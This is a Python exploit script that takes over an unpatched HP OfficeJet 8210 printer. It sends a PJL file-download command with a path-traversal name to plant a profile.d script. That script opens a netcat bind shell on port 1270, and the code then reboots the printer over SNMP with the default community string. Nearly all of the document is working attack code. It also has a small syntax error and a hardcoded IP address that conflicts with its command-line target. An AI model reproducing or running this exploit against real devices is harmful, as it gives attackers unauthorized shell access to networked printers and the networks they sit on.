##
# Create a bind shell on an unpatched OfficeJet 8210
# Write a script to profile.d and reboot the device. When it comes
# back online then nc to port 1270.
#
# easysnmp instructions:
# sudo apt-get install libsnmp-dev
# pip install easysnmp
##

import socket
import sys
from easysnmp import snmp_set

profile_d_script = ('if [ ! -p /tmp/pwned ]; then\n'
                    '\tmkfifo /tmp/pwned\n'
                    '\tcat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &\n
                    'fi\n')

if len(sys.argv) != 3:
    print '\nUsage:upload.py [ip] [port]\n'
    sys.exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
server_address = (sys.argv[1], int(sys.argv[2]))
print 'connecting to %s port %s' % server_address
sock.connect(server_address)

dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(profile_d_script)) + ' NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n'
dir_query += profile_d_script
dir_query += '\x1b%-12345X'
sock.sendall(dir_query)
sock.close()

sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock1.connect(server_address)
dir_query = '@PJL FSQUERY NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n'
sock1.sendall(dir_query)

response = ''
while True:
    data = sock1.recv(1)
    if '\n' == data: break
    response += data

print response
snmp_set('.1.3.6.1.2.1.43.5.1.1.3.1', 4, 'integer', hostname='192.168.1.158', community='public', version=1)
print 'Done! Try port 1270 in ~30 seconds'